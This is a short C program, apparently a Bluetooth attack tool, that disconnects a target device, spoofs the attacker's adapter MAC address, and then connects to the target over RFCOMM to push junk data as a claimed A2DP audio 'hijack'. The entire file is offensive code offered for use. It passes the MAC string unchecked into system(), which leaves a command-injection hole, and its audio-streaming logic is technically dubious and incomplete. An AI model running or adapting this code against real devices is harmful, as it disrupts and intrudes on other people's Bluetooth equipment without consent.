#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/rfcomm.h>
#include <sys/socket.h>

void exec_command(const char *cmd) {
    system(cmd);
}

void disconnect_device(const char *target_mac) {
    char cmd[100];
    snprintf(cmd, sizeof(cmd), "bluetoothctl disconnect %s", target_mac);
    exec_command(cmd);
    sleep(2);
}

void spoof_mac(const char *new_mac) {
    char cmd[100];
    snprintf(cmd, sizeof(cmd), "bdaddr -i hci0 %s", new_mac);
    exec_command(cmd);
    sleep(1);
}

void stream_audio(const char *target_mac) {
    struct sockaddr_rc addr = {0};
    int sock = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
    
    if (sock < 0) {
        printf("[!] Failed to create socket\n");
        return;
    }

    addr.rc_family = AF_BLUETOOTH;
    addr.rc_channel = 1;
    str2ba(target_mac, &addr.rc_bdaddr);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        printf("[!] Connection to A2DP target failed\n");
        close(sock);
        return;
    }

    printf("[+] Connected to %s! Streaming audio...\n", target_mac);
    const char *audio_data = "AAAAAAAAAAAAAAAAA";
    for (int i = 0; i < 100; i++) {
        send(sock, audio_data, strlen(audio_data), 0);
        usleep(50000);
    }

    close(sock);
}

void hijack_a2dp(const char *target_mac) {
    printf("[*] Hijacking A2DP stream from: %s\n", target_mac);
    disconnect_device(target_mac);
    const char *spoofed_mac = "11:22:33:44:55:66";
    spoof_mac(spoofed_mac);
    stream_audio(target_mac);
}
